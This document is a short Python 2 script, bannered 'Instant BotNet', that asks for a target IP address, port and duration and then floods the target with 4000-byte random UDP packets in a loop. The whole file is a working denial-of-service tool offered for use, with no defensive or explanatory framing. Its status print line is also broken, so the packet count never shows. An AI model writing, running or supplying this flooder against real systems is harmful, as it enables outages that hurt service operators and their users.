import os
import sys
import time
import socket
import random
import pyfiglet


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(4000)

os.system("clear")
ascii_banner = pyfiglet.figlet_format("Instant BotNet")
print(ascii_banner)
ip = raw_input("Ip Adress: ")
port = input("Port: ")
times = input("Time: ")
timeout = time.time() + times
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print
        "Sent %s packets to %s through port %s" % (sent, ip, port)
    except KeyboardInterrupt:
        sys.exit()
